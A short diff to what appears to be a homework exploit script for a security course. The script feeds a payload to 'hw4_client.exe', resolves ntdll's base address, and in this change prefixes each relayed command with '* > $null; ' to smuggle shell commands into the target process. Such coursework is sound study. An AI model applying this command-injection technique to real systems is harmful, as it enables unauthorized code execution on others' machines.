@@ -13,6 +13,8 @@ def GetModuleHandle(module):
 
 ntdll_base = GetModuleHandle("ntdll")
 
+part4 = True
+
 exe_path = "hw4_client.exe"
 
 # Start the process
@@ -30,9 +32,12 @@ process.stdin.write(payload)
 process.stdin.flush()
 
 while True:
-    myInput = input()
-    if myInput == 'exit':
+    func_input = input()
+    if func_input == 'exit':
         process.kill()
         break
-    process.stdin.write(str.encode(myInput + "\n"))
+    
+    if part4:
+        func_input = "* > $null; " + func_input
+    process.stdin.write(str.encode(func_input + "\n"))
     process.stdin.flush()
